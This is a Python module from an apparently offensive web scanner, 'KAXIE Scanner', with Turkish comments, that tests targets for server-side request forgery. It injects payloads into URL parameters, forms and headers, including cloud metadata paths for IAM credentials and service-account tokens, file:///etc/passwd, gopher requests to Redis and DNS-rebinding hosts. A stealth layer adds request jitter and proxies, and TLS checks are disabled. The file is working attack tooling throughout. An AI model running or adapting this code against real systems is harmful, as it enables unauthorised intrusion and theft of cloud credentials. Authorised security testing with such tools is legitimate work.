"""
KAXIE Scanner - SSRF (Server-Side Request Forgery) Tarama Modülü
"""

import requests
import re
import time
from urllib.parse import urljoin, urlparse, urlencode, parse_qs
from config import SCAN_CONFIG, Colors
from utils.stealth import StealthManager


class SSRFScanner:
    """SSRF zafiyetlerini tespit eden sınıf."""

    def __init__(self, target, reporter, ai_engine=None, forms=None, links=None):
        self.target = target
        self.reporter = reporter
        self.ai_engine = ai_engine
        self.forms = forms or []
        self.links = links or []
        self.stealth = StealthManager()
        self.session = requests.Session()
        self.session.verify = SCAN_CONFIG["verify_ssl"]
        self.vulnerable = []

    def run(self):
        """Tüm SSRF testlerini çalıştırır."""
        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.CYAN}  [*] SSRF TARAMASI BAŞLADI{Colors.RESET}")
        print(f"{Colors.CYAN}  [*] Hedef: {self.target}{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")

        self._test_url_params()
        self._test_forms()
        self._test_headers()
        self._test_cloud_metadata()
        self._test_dns_rebinding()

        if self.ai_engine and self.ai_engine.selected_model and self.vulnerable:
            print(f"\n{Colors.MAGENTA}  [*] AI SSRF analizi yapılıyor...{Colors.RESET}")
            for v in self.vulnerable:
                analysis = self.ai_engine.analyze_vulnerability(
                    vuln_type="SSRF",
                    target=v["url"],
                    evidence=v["evidence"],
                    response_snippet=v.get("response", ""),
                )
                if analysis:
                    self.reporter.add_ai_analysis("SSRF", analysis)

        return self.vulnerable

    def _make_request(self, url, method="GET", data=None, headers=None):
        """İstek yapar."""
        if headers is None:
            headers = self.stealth.get_headers(self.target)
        self.stealth.jitter_delay()

        try:
            if method.upper() == "GET":
                resp = self.session.get(url, headers=headers, timeout=SCAN_CONFIG["timeout"], verify=False, allow_redirects=True, proxies=self.stealth.get_proxy())
            else:
                resp = self.session.post(url, data=data, headers=headers, timeout=SCAN_CONFIG["timeout"], verify=False, allow_redirects=True, proxies=self.stealth.get_proxy())
            self.reporter.scan_stats["total_requests"] += 1
            return resp
        except Exception:
            return None

    def _get_ssrf_payloads(self):
        """SSRF payload listesi."""
        return [
            "http://127.0.0.1",
            "http://localhost",
            "http://[::1]",
            "http://[0:0:0:0:0:0:0:1]",
            "http://0x7f000001",
            "http://2130706433",
            "http://0177.0.0.1",
            "http://127.1",
            "http://127.0.0.1:22",
            "http://127.0.0.1:3306",
            "http://127.0.0.1:6379",
            "http://127.0.0.1:8080",
            "http://127.0.0.1:9200",
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/meta-data/public-keys/",
            "http://169.254.169.254/latest/dynamic/instance-identity/document",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://100.100.100.200/latest/meta-data/",
            "http://192.0.0.192/latest/",
            "file:///etc/passwd",
            "file:///proc/self/environ",
            "dict://127.0.0.1:6379/INFO",
            "gopher://127.0.0.1:6379/_INFO",
            "gopher://127.0.0.1:3306/_",
            "ldap://127.0.0.1:389/",
            "ftp://127.0.0.1:21/",
            "http://192.168.1.1",
            "http://10.0.0.1",
            "http://172.16.0.1",
        ]

    def _check_ssrf_response(self, resp, payload):
        """SSRF yanıtını analiz eder."""
        if not resp:
            return None

        cloud_indicators = [
            r"ami-id", r"instance-id", r"instance-type", r"local-ipv4", r"public-ipv4",
            r"accountId", r"architecture", r"availabilityZone", r"ramdiskId",
            r"project-id", r"numeric-project-id", r"zone", r"email",
            r"access-token", r"token", r"scopes",
        ]

        service_indicators = [
            r"SSH-", r"Redis", r"MariaDB", r"MySQL", r"FTP", r"OK", r"Elastic",
            r"root:", r"nobody:", r"daemon:", r"PATH=", r"HTTP_USER_AGENT",
        ]

        text = resp.text
        for ind in cloud_indicators:
            if re.search(ind, text, re.IGNORECASE):
                return f"cloud-metadata:{ind}"

        for ind in service_indicators:
            if re.search(ind, text, re.IGNORECASE):
                return f"service-response:{ind}"

        if resp.status_code == 200 and len(resp.content) > 0:
            if any(x in payload for x in ["169.254.169.254", "metadata.google", "100.100.100.200"]):
                if len(resp.content) > 100:
                    return "potential-metadata"

        return None

    def _test_url_params(self):
        """URL parametrelerinde SSRF testi."""
        print(f"\n  {Colors.BLUE}[*] URL parametrelerinde SSRF testi...{Colors.RESET}")

        test_urls = []
        parsed_base = urlparse(self.target)
        if parsed_base.query:
            test_urls.append(self.target)

        for link in self.links[:20]:
            parsed = urlparse(link)
            if parsed.query:
                test_urls.append(link)

        ssrf_params = ["url", "uri", "path", "dest", "redirect", "link", "src", "source", "file", "html", "site", "domain", "callback", "return", "next", "reference", "ref"]

        for url in test_urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            for param_name in params:
                if any(sp in param_name.lower() for sp in ssrf_params) or True:
                    for payload in self._get_ssrf_payloads()[:15]:
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

                        resp = self._make_request(test_url)
                        result = self._check_ssrf_response(resp, payload)
                        if result:
                            evidence = f"Param: {param_name}, Payload: {payload}, Result: {result}"
                            self.reporter.add_finding(
                                vuln_type="SSRF",
                                severity="CRITICAL",
                                title=f"SSRF zafiyeti tespit edildi ({param_name})",
                                description="Sunucu tarafı istek sahteciliği. Dahili servislere ve metadata'ya erişim mümkün.",
                                evidence=evidence,
                                url=test_url,
                            )
                            self.vulnerable.append({
                                "url": test_url,
                                "param": param_name,
                                "payload": payload,
                                "evidence": evidence,
                                "response": resp.text[:300] if resp else "",
                            })
                            break

    def _test_forms(self):
        """Form alanlarında SSRF testi."""
        print(f"\n  {Colors.BLUE}[*] Form alanlarında SSRF testi...{Colors.RESET}")

        ssrf_payloads = [
            "http://127.0.0.1:22",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "file:///etc/passwd",
        ]

        for form in self.forms[:5]:
            action = form.get("action", self.target)
            method = form.get("method", "GET")
            inputs = form.get("inputs", [])

            for inp in inputs:
                param_name = inp.get("name", "")
                if not param_name:
                    continue

                for payload in ssrf_payloads:
                    data = {i.get("name", f"f_{j}"): "test" for j, i in enumerate(inputs) if i.get("name")}
                    data[param_name] = payload

                    resp = self._make_request(action, method=method, data=data)
                    result = self._check_ssrf_response(resp, payload)
                    if result:
                        evidence = f"Form: {action}, Field: {param_name}, Payload: {payload}"
                        self.reporter.add_finding(
                            vuln_type="SSRF",
                            severity="CRITICAL",
                            title=f"Form-based SSRF ({param_name})",
                            description="Form alanı üzerinden SSRF. Dahili servis taraması mümkün.",
                            evidence=evidence,
                            url=action,
                        )
                        self.vulnerable.append({
                            "url": action,
                            "param": param_name,
                            "payload": payload,
                            "evidence": evidence,
                            "response": resp.text[:300] if resp else "",
                        })
                        break

    def _test_headers(self):
        """HTTP başlıklarında SSRF testi."""
        print(f"\n  {Colors.BLUE}[*] HTTP başlıklarında SSRF testi...{Colors.RESET}")

        header_payloads = {
            "X-Forwarded-For": ["169.254.169.254", "127.0.0.1"],
            "X-Real-IP": ["169.254.169.254"],
            "X-Remote-IP": ["169.254.169.254"],
            "X-Originating-IP": ["169.254.169.254"],
            "Referer": ["http://169.254.169.254/latest/meta-data/"],
            "X-Api-Version": ["http://169.254.169.254/latest/meta-data/"],
        }

        for header_name, payloads in header_payloads.items():
            for payload in payloads:
                headers = self.stealth.get_headers(self.target)
                headers[header_name] = payload

                resp = self._make_request(self.target, headers=headers)
                result = self._check_ssrf_response(resp, payload)
                if result:
                    evidence = f"Header: {header_name}, Payload: {payload}"
                    self.reporter.add_finding(
                        vuln_type="SSRF",
                        severity="CRITICAL",
                        title=f"Header-based SSRF ({header_name})",
                        description=f"{header_name} başlığı üzerinden SSRF mümkün.",
                        evidence=evidence,
                        url=self.target,
                    )
                    self.vulnerable.append({
                        "url": self.target,
                        "param": header_name,
                        "payload": payload,
                        "evidence": evidence,
                        "response": resp.text[:300] if resp else "",
                    })
                    break

    def _test_cloud_metadata(self):
        """Bulut metadata erişim testi."""
        print(f"\n  {Colors.BLUE}[*] Bulut metadata erişim testi...{Colors.RESET}")

        metadata_endpoints = [
            ("http://169.254.169.254/latest/meta-data/", "AWS"),
            ("http://169.254.169.254/latest/user-data/", "AWS-UserData"),
            ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS-IAM"),
            ("http://metadata.google.internal/computeMetadata/v1/instance/", "GCP"),
            ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "GCP-Token"),
            ("http://100.100.100.200/latest/meta-data/", "Alibaba"),
            ("http://192.0.0.192/latest/", "Oracle"),
        ]

        parsed = urlparse(self.target)
        if not parsed.query:
            return

        params = parse_qs(parsed.query)

        for param_name in params:
            for endpoint, cloud in metadata_endpoints:
                test_params = params.copy()
                test_params[param_name] = [endpoint]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

                resp = self._make_request(test_url)
                if resp:
                    if cloud.startswith("AWS") and "ami-id" in resp.text:
                        evidence = f"AWS metadata accessed via {param_name}. Cloud: {cloud}"
                    elif cloud.startswith("GCP") and "project-id" in resp.text:
                        evidence = f"GCP metadata accessed via {param_name}. Cloud: {cloud}"
                    elif len(resp.content) > 200 and resp.status_code == 200:
                        evidence = f"Potential {cloud} metadata. Param: {param_name}"
                    else:
                        continue

                    self.reporter.add_finding(
                        vuln_type="SSRF",
                        severity="CRITICAL",
                        title=f"Cloud Metadata SSRF ({cloud})",
                        description=f"{cloud} metadata servisine erişim mümkün. IAM credential sızdırılabilir.",
                        evidence=evidence,
                        url=test_url,
                    )
                    self.vulnerable.append({
                        "url": test_url,
                        "param": param_name,
                        "payload": endpoint,
                        "evidence": evidence,
                        "response": resp.text[:300],
                    })
                    break

    def _test_dns_rebinding(self):
        """DNS rebinding testi."""
        print(f"\n  {Colors.BLUE}[*] DNS rebinding testi...{Colors.RESET}")

        rebinding_payloads = [
            "http://1u.ms/",
            "http://make-127.0.0.1-rebind-169.254.169.254.sslip.io/",
            "http://127.0.0.1.nip.io/",
        ]

        parsed = urlparse(self.target)
        if not parsed.query:
            return

        params = parse_qs(parsed.query)

        for param_name in params:
            for payload in rebinding_payloads:
                test_params = params.copy()
                test_params[param_name] = [payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

                resp = self._make_request(test_url)
                if resp and resp.status_code == 200:
                    if any(x in resp.text for x in ["meta-data", "instance-id", "ami-id"]):
                        evidence = f"DNS rebinding successful. Param: {param_name}, Payload: {payload}"
                        self.reporter.add_finding(
                            vuln_type="SSRF",
                            severity="CRITICAL",
                            title="DNS Rebinding SSRF",
                            description="DNS rebinding ile IP kısıtlaması atlatılabiliyor.",
                            evidence=evidence,
                            url=test_url,
                        )
                        self.vulnerable.append({
                            "url": test_url,
                            "param": param_name,
                            "payload": payload,
                            "evidence": evidence,
                            "response": resp.text[:300],
                        })
                        break
